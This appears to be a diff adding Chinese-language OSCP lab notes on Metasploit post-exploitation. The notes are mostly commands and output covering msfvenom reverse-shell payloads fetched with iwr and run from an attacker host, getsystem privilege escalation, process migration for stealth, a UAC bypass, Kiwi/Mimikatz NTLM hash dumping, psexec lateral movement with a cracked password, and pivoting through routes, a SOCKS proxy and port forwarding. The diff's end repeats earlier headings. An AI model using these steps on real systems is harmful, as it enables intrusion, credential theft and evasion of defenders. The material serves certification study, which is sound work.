@@ -1878,3 +1878,545 @@ C:\Users\justin>
 ## Performing Post-Exploitation with Metasploit
 Metasploit 的後滲透（Post-Exploitation）功能，即 成功入侵目標機器後，如何利用已獲得的存取權限進行進一步的攻擊
 ### Core Meterpreter Post-Exploitation Features
+Meterpreter 在後滲透中的用途:
+- 確認目標機狀態（用戶是否在線）
+- 提權
+- 隱藏惡意程式的執行（Process Migration）
+- 設置持久後門（Persistence）
+- 竊取敏感數據（如 Hashdump 取得 NTLM 密碼 Hash）
+
+#### 1. 建立 Meterpreter reverse shell 執行檔
+```
+┌──(chw㉿CHW)-[~]
+└─$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.216 LPORT=443 -f exe -o met.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 202844 bytes
+Final size of exe file: 209408 bytes
+Saved as: met.exe
+┌──(chw㉿CHW)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+nc 到 Target Machine 執行 reverse shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc 192.168.185.223 4444
+Microsoft Windows [Version 10.0.22000.1219]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\luiza>powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\luiza> iwr -uri http://192.168.45.216/met.exe -Outfile met.exe   
+iwr -uri http://192.168.45.216/met.exe -Outfile met.exe
+PS C:\Users\luiza> .\met.exe
+.\met.exe
+```
+
+啟動 Metasploit multi/handler 監聽，一旦 Windows 二進位執行，Metasploit 會開啟了一個新的 session。
+```
+msf6 exploit(multi/handler) > set payload
+payload => windows/x64/meterpreter_reverse_https
+msf6 exploit(multi/handler) > set LPORT 443
+msf6 exploit(multi/handler) > run
+
+[*] Started HTTPS reverse handler on https://192.168.45.216:443
+[*] https://192.168.45.216:443 handling request from 192.168.185.223; (UUID: ispbjx6j) Redirecting stageless connection from /gH_Jh1M6di0TmhKYdFEKIADmYC61ar20gvUCK7dhOCIFRQg5HbtwVKvs5 with UA 'Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1'
+[*] https://192.168.45.216:443 handling request from 192.168.185.223; (UUID: ispbjx6j) Attaching orphaned/stageless session...
+[*] Meterpreter session 3 opened (192.168.45.216:443 -> 192.168.185.223:62763) at 2025-03-07 11:07:28 -0500
+
+meterpreter >
+```
+
+#### 2. Post-Exploitation 指令
+##### 2.1 檢查用戶是否在線 (idletime)
+```
+meterpreter > idletime
+User has been idle for: 32 mins 8 secs
+```
+user 已經 9 分 53 秒沒有與系統交互，可能表示使用者可能已經離開電腦
+
+##### 2.1 提升權限 (getsystem)
+1. 確認當前使用者
+```
+meterpreter > getuid
+Server username: ITWK01\luiza
+```
+2. 查看目前擁有的權限
+```
+meterpreter > shell
+Process 8720 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.1219]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\luiza>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+...
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+...
+C:\Users\luiza>exit
+exit
+```
+> SeImpersonatePrivilege 已啟用，可以嘗試 Named Pipe Impersonation 來提權。
+
+3. 使用 getsystem 自動提權
+>[!Note]
+>getsystem 會嘗試 所有可用的提權技術，主要依賴 [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication) 和 [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) 兩種 Windows 權限。
+
+![image](https://hackmd.io/_uploads/SkA4AquoJl.png)
+
+```
+meterpreter > getuid
+Server username: ITWK01\luiza
+meterpreter > getsystem
+[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact <id> --timeout <value>                                                                                  
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+> 成功提升到 NT AUTHORITY\SYSTEM
+
+>[!Important]
+>在 Windows 中，`NT AUTHORITY\SYSTEM` 是 擁有最高權限的內建帳戶，比管理員（`Administrator`）權限還要高
+
+##### 2.3 隱藏惡意 process (migrate)
+`ps` 來查看所有正在運行的 process
+```
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name             Arch  Session  User                        Path
+ ---   ----  ----             ----  -------  ----                        ----
+ ...
+ 780   3500  met.exe          x64   0        ITWK01\luiza                C:\Users\luiza\met.exe
+ 5976  5512  OneDrive.exe     x64   1        ITWK01\offsec               C:\Users\offsec\AppData\Lo
+                                                                         cal\Microsoft\OneDrive\One
+ ...
+ 
+```
+> 顯示 process `met.exe` 的 PID 為 `2552` (**容易被發現**)\
+> offsec 啟用了一個 OneDrive 相關的 process，PID 為 `5976`。
+
+migrate 到 OneDrive.exe 的 process (不容易引起懷疑)
+```
+meterpreter > migrate 5976
+[*] Migrating from 780 to 5976...
+[*] Migration completed successfully.
+meterpreter > ps
+meterpreter > getuid
+Server username: ITWK01\offsec
+
+```
+> Meterpreter 已 migrate 在 OneDrive.exe 中執行，變得更隱蔽\
+> 以 offsec 帳戶執行，並隱藏在 OneDrive.exe process 中
+
+找不到適合的 process 來 migrate，可以創建一個新的 process
+```
+meterpreter > execute -H -f notepad
+Process 2720 created.
+
+meterpreter > migrate 2720
+[*] Migrating from 5976 to 2720...
+[*] Migration completed successfully.
+
+meterpreter > 
+```
+##### 2.4 其他功能
+除了基本的提權與 process migrate 外，Meterpreter 還有許多強大的後滲透功能：、
+![image](https://hackmd.io/_uploads/rkAHUjOoJx.png)
+
+#### Post-Exploitation Modules
+在 Windows 中，即使使用者擁有 Administrator 權限，他們執行的應用程式 默認運行在 Medium Integrity 層級，受到 UAC 限制，無法直接進行高級別的系統操作（如安裝驅動、修改系統檔案等）。\
+如何 Bypass UAC
+
+Reverse shell 方法與上一節相同，直接進到 meterpreter
+```
+meterpreter > getsystem
+meterpreter > ps
+meterpreter > migrate 5976
+[*] Migrating from 8348 to 5976...
+[*] Migration completed successfully.
+
+meterpreter > getuid
+Server username: ITWK01\offsec
+```
+#### 1. 查詢目前 process 的完整性等級
+顯示完整性級別，可以透過 [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)等工具 或第三方 PowerShell 模組（如 [NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/1.1.33)）
+```
+meterpreter > shell
+C:\Windows\system32>powershell -ep bypass
+PS C:\Windows\system32> Import-Module NtObjectManager
+PS C:\Windows\system32> Get-NtTokenIntegrityLevel
+Get-NtTokenIntegrityLevel
+Medium
+```
+> `Medium`: 表示我們目前無法執行系統級別的操作
+
+離開當前 Session，暫存在 Background
+```
+PS C:\Windows\system32> ^Z
+Background channel 1? [y/N]  y
+meterpreter > bg
+[*] Backgrounding session 4...
+```
+> Backgrounding session 4
+#### 2. 在 Metasploit 中搜尋 UAC 繞過模組
+```
+msf6 exploit(multi/handler) > search UAC
+
+Matching Modules
+================
+
+   #   Name                                                   Disclosure Date  Rank       Check  Description
+   -   ----                                                   ---------------  ----       -----  -----------
+-   ----                                                   ---------------  ----       -----  -----------
+   0   post/windows/manage/sticky_keys                                         normal     No     Sticky Keys Persistance Module
+   1   exploit/windows/local/cve_2022_26904_superprofile      2022-03-17       excellent  Yes    User Profile Arbitrary Junction Creation Local Privilege Elevation
+   2   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
+   3   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
+   ...
+   11  exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
+   12  exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
+   ...
+```
+> `exploit/windows/local/bypassuac_sdclt` 目標是 Microsoft 二進位檔案 `sdclt.exe`。可以透過產生 完整性等級為High 來 [bypass UAC by spawning a process](https://threatpost.com/fileless-uac-bypass-uses-windows-backup-and-restore-utility/124579/)。
+
+#### 3. 執行 UAC Bypass 攻擊
+SESSION 設定剛才暫存的 Background
+```
+msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
+msf6 exploit(windows/local/bypassuac_sdclt) > show options
+
+Module options (exploit/windows/local/bypassuac_sdclt):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   PAYLOAD_NAME                   no        The filename to use for the payload binary (%RAND% by default).
+   SESSION                        yes       The session to run this module on
+...
+
+msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 4
+msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.45.216
+msf6 exploit(windows/local/bypassuac_sdclt) > run
+
+[*] Started reverse TCP handler on 192.168.45.216:4444 
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[+] UAC is set to Default
+[+] BypassUAC can bypass this setting, continuing...
+[!] This exploit requires manual cleanup of 'C:\Users\offsec\AppData\Local\Temp\XCujwCAFkQNYol.exe'
+[*] Please wait for session and cleanup....
+[*] Sending stage (201798 bytes) to 192.168.185.223
+[*] Meterpreter session 5 opened (192.168.45.216:4444 -> 192.168.185.223:51179) at 2025-03-07 12:59:51 -0500
+[*] Registry Changes Removed
+
+```
+創建一個新的 meterpreter 驗證是否成功
+```
+meterpreter > shell
+C:\Windows\system32> powershell -ep bypass
+PS C:\Windows\system32> Import-Module NtObjectManager
+Import-Module NtObjectManager
+
+PS C:\Windows\system32> Get-NtTokenIntegrityLevel
+Get-NtTokenIntegrityLevel
+High
+
+```
+> 完整性等級變為 High，成功繞過 UAC
+
+#### 4. 使用 Kiwi（Mimikatz）提取 Windows NTLM Hash
+>[!Note]
+> Kiwi 是 Metasploit 內建的 Mimikatz 擴展模組，可用於提取 Windows 的登入密碼、NTLM Hash 等 (可參考 [Part2 #Working with Password Hashes](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md#cracking-ntlm))
+
+```
+msf6 exploit(windows/local/bypassuac_sdclt) > use exploit/multi/handler
+msf6 exploit(multi/handler) > run
+meterpreter > getsystem
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+
+meterpreter > help
+
+...
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_livessp          Retrieve Live SSP creds
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    ...
+```
+使用 creds_msv 提取 NTLM Hash
+```
+meterpreter > creds_msv
+[+] Running as SYSTEM
+[*] Retrieving msv credentials
+msv credentials
+===============
+
+Username  Domain  NTLM                              SHA1
+--------  ------  ----                              ----
+luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
+offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb3819546426c2f6bd80bbd
+```
+> 成功取得 NTLM Hash，再用 Hydra 爆破
+
+### Pivoting with Metasploit
+使用 Metasploit 進行橫向移動，包括手動設定路由、使用 `autoroute` 自動設置路由，以及使用 SOCKS proxy 和 Port Forwarding 來存取內網的其他機器。
+#### 1. 發現內網
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc 192.168.185.223 4444
+C:\Users\luiza>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::a820:8d4c:ecb6:92a9%11
+   IPv4 Address. . . . . . . . . . . : 192.168.185.223
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.185.254
+
+Ethernet adapter Ethernet1:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::2f15:176f:dd7a:737b%14
+   IPv4 Address. . . . . . . . . . . : 172.16.140.199
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+```
+> 能同時通外網與內網
+
+注入 Reverse shell
+```
+C:\Users\luiza>powershell
+PS C:\Users\luiza> iwr -uri http://192.168.45.216/met.exe -Outfile met.exe
+iwr -uri http://192.168.45.216/met.exe -Outfile met.exe
+PS C:\Users\luiza> .\met.exe
+```
+
+#### 2. 建立 Meterpreter session 並設定路由
+```
+msf6 exploit(multi/handler) > set payload  windows/x64/meterpreter_reverse_https
+msf6 exploit(multi/handler) > run
+meterpreter > bg
+[*] Backgrounding session 1...
+```
+使用 route add 設定內網路由 `172.16.140.0/24`:
+```
+msf6 exploit(multi/handler) > route add 172.16.140.0/24 1
+[*] Route added
+msf6 exploit(multi/handler) > route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.16.140.0       255.255.255.0      Session 1
+
+[*] There are currently no IPv6 routes defined.
+```
+> 表示所有發往 172.16.140.0/24 的流量都會經過 Session 1 轉送
+#### 3. 掃描內部網絡
+```
+msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.140.200
+msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
+PORTS => 445,3389
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+[+] 172.16.140.200:       - 172.16.140.200:445 - TCP OPEN
+[+] 172.16.140.200:       - 172.16.140.200:3389 - TCP OPEN
+[*] 172.16.140.200:       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+> `445（SMB）`：可能可用 `psexec` 模組進行未授權的遠端命令執行\
+`3389（RDP）`：可以嘗試 RDP 存取目標系統
+
+#### 4. 使用 psexec 進行橫向移動
+前一章節已經取得 luiza 帳號的 NTLM Hash，並破解出明文密碼 `BoccieDearAeroMeow1!`。\
+使用 psexec 在 172.16.140.200 上建立新的 Meterpreter 會話：
+```
+msf6 exploit(windows/smb/psexec) > set SMBUser luiza
+msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
+msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
+msf6 exploit(windows/smb/psexec) > set LPORT 8000
+msf6 exploit(windows/smb/psexec) > run
+[*] 172.16.140.200:445 - Connecting to the server...
+[*] 172.16.140.200:445 - Authenticating to 172.16.140.200:445 as user 'luiza'...
+[*] 172.16.140.200:445 - Selecting PowerShell target
+[*] 172.16.140.200:445 - Executing the payload...
+[+] 172.16.140.200:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Started bind TCP handler against 172.16.140.200:8000
+[*] Sending stage (201798 bytes) to 172.16.140.200
+[*] Meterpreter session 3 opened (172.16.140.199:50445 -> 172.16.140.200:8000 via session 1) at 2025-03-07 13:58:59 -0500
+
+meterpreter > 
+
+```
+> 成功第二個目標上取得了 Meterpreter shell
+
+#### - 自動設置路由
+在第一台機器 (session 1) 進行自動路由\
+上述已設定 Route added
+```
+msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > show options
+msf6 post(multi/manage/autoroute) > sessions -l
+msf6 post(multi/manage/autoroute) > set session 1
+session => 1
+msf6 post(multi/manage/autoroute) > run
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[*] Running module against ITWK01
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 172.16.140.0/255.255.255.0 from host's routing table.
+[+] Route added to subnet 192.168.140.0/255.255.255.0 from host's routing table.
+[*] Post module execution completed
+```
+> 現在可以直接存取 172.16.5.0/24 內的設備
+
+#### - 建立 SOCKS proxy 進行 Tunneling
+```
+msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy 
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > set VERSION 1
+msf6 auxiliary(server/socks_proxy) > run -j
+[*] Auxiliary module running as background job 0.
+[*] Starting the SOCKS proxy server
+```
+(在 Kali 本機設定 sock)
+```
+┌──(chw㉿CHW)-[~]
+└─$ tail /etc/proxychains4.conf
+...
+socks5 127.0.0.1 1080
+```
+RDP Target machine
+```
+sudo proxychains xfreerdp /v:172.16.140.200 /u:luiza
+```
+![image](https://hackmd.io/_uploads/BkMXI6do1e.png)
+
+#### - 使用 portfwd 進行 port fowarding
+不想使用 SOCKS 代理，也可以使用 portfwd 來將 `172.16.140.200:3389` 映射到本機
+```
+meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.140.200
+[*] Local TCP relay created: :3389 <-> 172.16.140.200:3389
+```
+RDP Target machine
+```
+sudo proxychains xfreerdp /v:172.16.140.200 /u:luiza
+```
+### Automating Metasploit
+如何使用 Metasploit 的 [Resource Scripts](https://docs.rapid7.com/metasploit/resource-scripts/) 來自動化滲透測試中的重複性操作，例如設定監聽器、多主機掃描、UAC 繞過等任務。這可以節省時間，減少手動輸入命令的錯誤，並提高測試效率。
+
+#### - 建立一個自動化監聽腳本
+上述每次啟動 Metasploit 時，都設置一個 multi/handler 來接收反向連線，可以建立一個 Resource Script
+```
+┌──(chw㉿CHW)-[~]
+└─$ vi  ~/pen200lab.rc
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST 192.168.45.216
+set LPORT 443
+set AutoRunScript post/windows/manage/migrate
+set ExitOnSession false
+run -z -j
+```
+讓 Metasploit 自動執行這些命令
+```
+┌──(chw㉿CHW)-[~]
+└─$ msfconsole -r ~/pen200lab.rc
+
+```
+##### 測試 Resource Script
+登入 RDP 執行 reverse shell
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /u:justin /p:SuperS3cure1337# /v:192.168.185.202
+```
+(Powershell)
+```
+PS C:\Users\justin> iwr -uri http://192.168.45.216/met.exe -Outfile met.exe                                             PS C:\Users\justin> .\met.exe
+```
+此時，Metasploit 會自動接收到來自 `192.168.185.202` 的反向連線，並自動將 Meterpreter 移動到 Notepad 進程，防止連線被關閉。
+
+>[!Important]
+> 可以不需要建立自己的 Resource Script，使用 Metasploit 已經提供的資源腳本。在 Metasploit 目錄中的 `scripts/resource/` 目錄中
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ ls -l /usr/share/metasploit-framework/scripts/resource
+total 160
+-rw-r--r-- 1 root root  7270 Jul 18  2024 auto_brute.rc
+-rw-r--r-- 1 root root 11224 Jul 18  2024 auto_cred_checker.rc
+-rw-r--r-- 1 root root  3422 Jul 18  2024 auto_pass_the_hash.rc
+-rw-r--r-- 1 root root   876 Jul 18  2024 auto_win32_multihandler.rc
+-rw-r--r-- 1 root root  2202 Jul 18  2024 autocrawler.rc
+-rw-r--r-- 1 root root  6565 Jul 18  2024 autoexploit.rc
+-rw-r--r-- 1 root root   155 Jul 18  2024 bap_all.rc
+-rw-r--r-- 1 root root   762 Jul 18  2024 bap_dryrun_only.rc
+-rw-r--r-- 1 root root   365 Jul 18  2024 bap_firefox_only.rc
+-rw-r--r-- 1 root root   358 Jul 18  2024 bap_flash_only.rc
+-rw-r--r-- 1 root root   354 Jul 18  2024 bap_ie_only.rc
+-rw-r--r-- 1 root root 20767 Jul 18  2024 basic_discovery.rc
+-rw-r--r-- 1 root root  4518 Jul 18  2024 dev_checks.rc
+-rw-r--r-- 1 root root  3358 Jul 18  2024 fileformat_generator.rc
+-rw-r--r-- 1 root root  1319 Jul 18  2024 meterpreter_compatibility.rc
+-rw-r--r-- 1 root root  1064 Jul 18  2024 mssql_brute.rc
+-rw-r--r-- 1 root root  4346 Jul 18  2024 multi_post.rc
+-rw-r--r-- 1 root root  1222 Jul 18  2024 nessus_vulns_cleaner.rc
+-rw-r--r-- 1 root root  1659 Jul 18  2024 oracle_login.rc
+-rw-r--r-- 1 root root   840 Jul 18  2024 oracle_sids.rc
+-rw-r--r-- 1 root root   490 Jul 18  2024 oracle_tns.rc
+-rw-r--r-- 1 root root   833 Jul 18  2024 port_cleaner.rc
+-rw-r--r-- 1 root root  2419 Jul 18  2024 portscan.rc
+-rw-r--r-- 1 root root  1251 Jul 18  2024 run_all_post.rc
+-rw-r--r-- 1 root root   333 Jul 18  2024 run_cve-2022-22960_lpe.rc
+-rw-r--r-- 1 root root   373 Jul 18  2024 run_progress_kemp_loadmaster_sudo_priv_esc_2024.rc
+-rw-r--r-- 1 root root  3084 Jul 18  2024 smb_checks.rc
+-rw-r--r-- 1 root root  3837 Jul 18  2024 smb_validate.rc
+-rw-r--r-- 1 root root  2592 Jul 18  2024 wmap_autotest.rc
+```
+# Active Directory Introduction and Enumeration
+C:\Users\justin>
+
+```
+## Performing Post-Exploitation with Metasploit
+Metasploit 的後滲透（Post-Exploitation）功能，即 成功入侵目標機器後，如何利用已獲得的存取權限進行進一步的攻擊
+### Core Meterpreter Post-Exploitation Features
